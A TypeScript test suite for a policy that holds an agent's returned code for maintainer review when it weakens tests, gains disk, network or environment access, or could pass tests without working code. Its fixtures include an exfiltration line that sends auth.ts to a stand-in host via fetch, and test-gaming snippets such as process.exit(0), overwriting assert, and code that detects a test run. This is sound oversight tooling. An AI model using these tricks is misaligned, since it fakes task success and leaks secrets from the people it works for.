/**
 * The hand-off policy on a test the slice was handed: an assertion removed
 * or rewritten, or a test skipped, is held for the maintainer.
 */

import assert from "node:assert/strict";
import { test } from "node:test";
import { gainedReach, handoffPolicy, integrityOf, reachOf, weakenedTest } from "../src/policy.js";

const TEST = [
  'import assert from "node:assert/strict";',
  'import { test } from "node:test";',
  'import { price } from "../src/price.js";',
  'test("prices", () => {',
  "  assert.equal(price(1), 4);",
  "  assert.equal(",
  "    price(2),",
  "    8,",
  "  );",
  "});",
  "",
].join("\n");

test("a test bent to pass is held for the maintainer; one only added to passes", () => {
  const path = "pkg/test/price.test.ts";
  assert.equal(weakenedTest(path, TEST, TEST), null);
  // An assertion added, the others kept: a stronger test.
  assert.equal(weakenedTest(path, TEST, TEST.replace("});", "  assert.equal(price(0), 0);\n});")), null);
  // Formatting alone changes nothing.
  assert.equal(weakenedTest(path, TEST, TEST.replace("  assert.equal(\n    price(2),\n    8,\n  );", "  assert.equal(price(2), 8);")), null);
  assert.match(weakenedTest(path, TEST, TEST.replace("price(1), 4", "price(1), 3")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("    8,", "    6,")) ?? "", /rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace("  assert.equal(price(1), 4);\n", "")) ?? "", /removes or rewrites 1 assertion/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices"', 'test.skip("prices"')) ?? "", /skips 1 more test/);
  assert.match(weakenedTest(path, TEST, TEST.replace('test("prices", ', 'test("prices", { skip: true }, ')) ?? "", /skips 1 more test/);
  // Vitest's expect, imported or global.
  const vitest = 'describe("p", () => { it("x", () => { expect(price(1)).toBe(4); }); });\n';
  assert.match(weakenedTest(path, vitest, vitest.replace("toBe(4)", "toBe(3)")) ?? "", /rewrites 1 assertion/);
});

test("an assertion that can no longer run counts as removed", () => {
  const path = "src/price.test.ts";
  const gutted = (from: string, to: string) => weakenedTest(path, TEST, TEST.replace(from, to)) ?? "";
  // Every assertion's text is still there, but none of it runs.
  assert.match(gutted('test("prices", () => {\n', 'test("prices", () => {\n  return;\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);\n", '  throw new Error("skip");\n  assert.equal(price(1), 4);\n'), /removes or rewrites 2 assertions/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  if (false) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  false && assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  // A branch that may not run holds its assertion only sometimes: held,
  // as a rewrite. One that always runs, and an early return after the
  // assertions, pass.
  assert.match(gutted("  assert.equal(price(1), 4);", "  if (process.env.X) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  for (const x of []) assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.match(gutted("  assert.equal(price(1), 4);", "  const later = () => assert.equal(price(1), 4);"), /removes or rewrites 1 assertion/);
  assert.equal(gutted("  assert.equal(price(1), 4);", "  if (true) assert.equal(price(1), 4);"), "");
  assert.equal(gutted("    8,\n  );\n", "    8,\n  );\n  return;\n"), "");
  // A failure swallowed by a catch that does not throw again.
  assert.match(gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch {}"), /removes or rewrites 1 assertion/);
  assert.equal(
    gutted("  assert.equal(price(1), 4);", "  try { assert.equal(price(1), 4); } catch (error) { log(error); throw error; }"),
    "",
  );
});

test("a script's reach beyond its own computation is read from its syntax", () => {
  const reach = (text: string) => reachOf("pkg/test/x.test.ts", text);
  // A test's ordinary imports reach nothing.
  assert.deepEqual(reach(TEST), []);
  assert.deepEqual(reach('import { setTimeout } from "node:timers/promises";\nimport { createHash } from "node:crypto";\n'), []);
  // The disk, the process, the network.
  assert.deepEqual(reach('import { readFileSync } from "node:fs";\n'), ["node:fs"]);
  assert.deepEqual(reach('import fs from "fs/promises";\n'), ["node:fs"]);
  assert.deepEqual(reach('const cp = require("child_process");\n'), ["node:child_process"]);
  assert.deepEqual(reach('const net = await import("node:net");\n'), ["node:net"]);
  assert.deepEqual(reach('import http = require("http");\n'), ["node:http"]);
  assert.deepEqual(reach('export { request } from "node:https";\n'), ["node:https"]);
  assert.deepEqual(reach('await fetch("https://example.test/" + secret);\n'), ["fetch"]);
  assert.deepEqual(reach("await globalThis.fetch(url);\n"), ["fetch"]);
  assert.deepEqual(reach('await globalThis["fetch"](url);\n'), ["fetch"]);
  assert.deepEqual(reach("const f = { fetch };\n"), ["fetch"]);
  assert.deepEqual(reach("new WebSocket(url);\n"), ["WebSocket"]);
  // The environment, and code run from text.
  assert.deepEqual(reach("const key = process.env.API_KEY;\n"), ["process.env"]);
  assert.deepEqual(reach('const key = process["env"].API_KEY;\n'), ["process.env"]);
  assert.deepEqual(reach("const key = import.meta.env.VITE_KEY;\n"), ["import.meta.env"]);
  assert.deepEqual(reach('eval("1");\nnew Function("return 1");\n'), ["Function", "eval"]);
  // Named by a computed value: could be any of the above.
  assert.deepEqual(reach("await import(name);\n"), ["a module named by a computed value"]);
  assert.deepEqual(reach('const m = require("node:" + "fs");\n'), ["a module named by a computed value"]);
  assert.deepEqual(reach('globalThis["fe" + "tch"](url);\n'), ["a global named by a computed value"]);
  assert.deepEqual(reach("process[key];\n"), ["a process member named by a computed value"]);
  // A service SDK.
  assert.deepEqual(reach('import { S3Client } from "@aws-sdk/client-s3";\n'), ["@aws-sdk/client-s3"]);
  // Members, types and type-only imports are not reads.
  assert.deepEqual(reach("client.fetch(1);\nconst o = { fetch: 1 };\nlet f: Function;\ntype F = typeof fetch;\n"), []);
  assert.deepEqual(reach('import type { Stats } from "node:fs";\nprocess.exitCode = 1;\n'), []);
});

test("a returned script that gains a reach is held; one that keeps its reach passes", () => {
  const path = "pkg/test/exfil.test.ts";
  const exfil = 'import { readFileSync } from "node:fs";\nawait fetch("https://x.test/?d=" + readFileSync("../../apps/api/src/auth.ts", "utf8"));\n';
  assert.deepEqual(gainedReach(path, null, exfil), ["fetch", "node:fs"]);
  // A module that read the disk before may keep doing so.
  const reader = 'import { readFileSync } from "node:fs";\nexport const load = (p: string) => readFileSync(p, "utf8");\n';
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, reader.replace('"utf8"', '"latin1"')), []);
  assert.deepEqual(gainedReach("pkg/src/load.ts", reader, `${reader}export const key = process.env.KEY;\n`), ["process.env"]);
  // Declarations and data run nothing.
  assert.deepEqual(gainedReach("pkg/src/x.d.ts", null, 'import "node:fs";\n'), []);
  assert.deepEqual(gainedReach("pkg/data.json", null, '{"fetch": 1}'), []);

  const judge = handoffPolicy({ reach: true });
  assert.match(judge(path, "added", { before: null, after: exfil }) ?? "", /reaches what it did not before \(fetch, node:fs\)/);
  assert.equal(judge(path, "added", { before: null, after: TEST }), null);
  // The maintainer, having read it, lets it through by path.
  assert.equal(handoffPolicy({ reach: true, allow: ["pkg/test/**"] })(path, "added", { before: null, after: exfil }), null);
  // Off unless asked: `gate` judges an agent in the repository, which may use the disk.
  assert.equal(handoffPolicy({})(path, "added", { before: null, after: exfil }), null);
});

test("a test's data, setup and mocks are held as its assertions are; additions pass", () => {
  const path = "pkg/test/price.test.ts";
  const DATA = [
    'import assert from "node:assert/strict";',
    'import { describe, it } from "node:test";',
    'import { price } from "../src/price.js";',
    "",
    "const input = 1;",
    "const expected = 4;",
    "",
    'describe("price", () => {',
    "  const tax = 0;",
    '  it("prices", () => {',
    "    const result = price(input) + tax;",
    "    assert.equal(result, expected);",
    "  });",
    "});",
    "",
  ].join("\n");
  const judge = (after: string) => weakenedTest(path, DATA, after) ?? "";
  // The value compared with, the data passed in, a setup line: rewritten.
  assert.match(judge(DATA.replace("const expected = 4;", "const expected = 3;")), /rewrites or removes 1 other statement/);
  assert.match(judge(DATA.replace("const input = 1;", "const input = 0;")), /rewrites or removes 1 other statement/);
  assert.match(judge(DATA.replace("    const result = price(input) + tax;", "    const result = 4;")), /rewrites or removes 1 other statement/);
  // A test added inside the describe, a name added to an import, a new
  // statement before the assertion: the old statements stay as they were.
  assert.equal(
    judge(DATA.replace("  });\n});", '  });\n  it("prices zero", () => {\n    assert.equal(price(0), 0);\n  });\n});')),
    "",
  );
  assert.equal(judge(DATA.replace("import { price }", "import { price, total }")), "");
  assert.equal(judge(DATA.replace("    assert.equal(result, expected);", "    const total = result * 2;\n    assert.equal(result, expected);")), "");
  // A mock of the code's own module stands in for it; a package's does not.
  assert.match(
    judge(`${DATA}vi.mock("../src/price.js", () => ({ price: () => 4 }));\n`),
    /mocks 1 more of the code's own modules \(\.\.\/src\/price\.js\)/,
  );
  assert.match(judge(`${DATA}mock.module("../src/price.js", { namedExports: { price: () => 4 } });\n`), /mocks 1 more/);
  assert.equal(judge(`${DATA}vi.mock("stripe");\n`), "");
  // A fake's method added passes; one rewritten is held.
  const FAKE = "export class FakeDb {\n  rows = [1];\n  count() { return this.rows.length; }\n}\n";
  assert.equal(weakenedTest("pkg/test/fakes.ts", FAKE, FAKE.replace("  count()", "  first() { return this.rows[0]; }\n  count()")), null);
  assert.match(weakenedTest("pkg/test/fakes.ts", FAKE, FAKE.replace("this.rows.length", "1")) ?? "", /rewrites or removes 1 other statement/);
});

test("a script that could pass a test without the code passing it is read from its syntax", () => {
  const inTest = (text: string) => integrityOf("pkg/test/x.test.ts", text);
  const inSource = (text: string) => integrityOf("pkg/src/x.ts", text);
  // Ending the run before the tests do, or swallowing their failures.
  assert.deepEqual(inTest("process.exit(0);\n"), ["process.exit"]);
  assert.deepEqual(inTest("process.exitCode = 0;\n"), ["process.exitCode"]);
  assert.deepEqual(inTest("process.kill(process.pid);\n"), ["process.kill"]);
  assert.deepEqual(inTest('process.on("uncaughtException", () => {});\n'), ['process.on("uncaughtException")']);
  assert.deepEqual(inTest("server.kill();\nprocess.kill(child.pid);\n"), []);
  // Rewriting the assertions or the runner, anywhere.
  assert.deepEqual(inTest('import assert from "node:assert/strict";\nassert.equal = () => {};\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  assert.deepEqual(inSource('import * as a from "node:assert";\nObject.assign(a, { ok() {} });\n'), [
    "rewrites the test runner or the assertion library",
  ]);
  // The code under test telling a test run from a real one.
  assert.deepEqual(inSource('export const f = () => (typeof describe === "function" ? 4 : 0);\n'), ["typeof describe"]);
  assert.deepEqual(inSource("if (import.meta.vitest) {}\n"), ["import.meta.vitest"]);
  assert.deepEqual(inSource("const t = process.env.VITEST;\n"), ["process.env.VITEST"]);
  assert.deepEqual(inSource('if (process.env.NODE_ENV === "test") {}\n'), ['NODE_ENV === "test"']);
  assert.deepEqual(inSource('const t = process.argv.join(" ").includes("test");\n'), ["process.argv matched against a test runner"]);
  assert.deepEqual(inSource("const g = globalThis.it;\n"), ["globalThis.it"]);
  // ... or rewriting a built-in it calls; a test may fake one for itself.
  assert.deepEqual(inSource("Array.prototype.includes = () => true;\n"), ["rewrites Array.prototype.includes"]);
  assert.deepEqual(inTest("Date.now = () => 0;\n"), []);
  // Ordinary code is none of these.
  assert.deepEqual(inSource('if (process.env.NODE_ENV === "production") {}\nconst args = process.argv.slice(2);\nexport function main() { process.exit(1); }\n'), []);
  assert.deepEqual(inTest('import { test } from "node:test";\ntest("x", () => {});\n'), []);
});

test("code built from text, a module from a URL or a name hidden behind a value counts as reach", () => {
  const reach = (text: string) => reachOf("pkg/src/x.ts", text);
  assert.deepEqual(reach('const run = ({} as any).constructor.constructor("return 1");\n'), ["a constructor called through .constructor"]);
  assert.deepEqual(reach('const r = require;\nr("fs");\n'), ["require taken as a value"]);
  assert.deepEqual(reach('const g = globalThis;\ng["fetch"]("x");\n'), ["the global object taken as a value"]);
  assert.deepEqual(reach('await import("data:text/javascript,export default 1");\n'), ["a module loaded from a URL"]);
  assert.deepEqual(reach("await WebAssembly.instantiate(bytes);\n"), ["WebAssembly"]);
  // Naming a module to resolve it, and a global's member by name, are not.
  assert.deepEqual(reach('const p = require.resolve("x");\nconst v = globalThis.structuredClone;\n'), []);
});

test("the policy holds a test's helper or fixture edited or deleted, and what could pass a test without the code", () => {
  const judge = handoffPolicy({ integrity: true });
  assert.match(judge("pkg/test/fixtures/order.json", "changed", { before: '{"total": 4}', after: '{"total": 3}' }) ?? "", /changes a test fixture/);
  assert.match(judge("pkg/test/helpers.ts", "deleted") ?? "", /deletes a test's helper or fixture/);
  assert.match(
    judge("pkg/src/price.ts", "changed", { before: "export const price = (n: number) => n * 4;\n", after: 'export const price = (n: number) => (typeof it === "function" ? 4 : n * 4);\n' }) ?? "",
    /could pass a test without the code passing it \(typeof it\)/,
  );
  assert.match(judge("pkg/test/price.test.ts", "added", { before: null, after: "process.exit(0);\n" }) ?? "", /process\.exit/);
  // A script that had it may keep it; off unless asked.
  assert.equal(judge("pkg/test/run.test.ts", "changed", { before: "process.exitCode = 1;\n", after: "process.exitCode = 1;\nconst x = 1;\n" }), null);
  assert.equal(handoffPolicy({})("pkg/test/price.test.ts", "added", { before: null, after: "process.exit(0);\n" }), null);
});
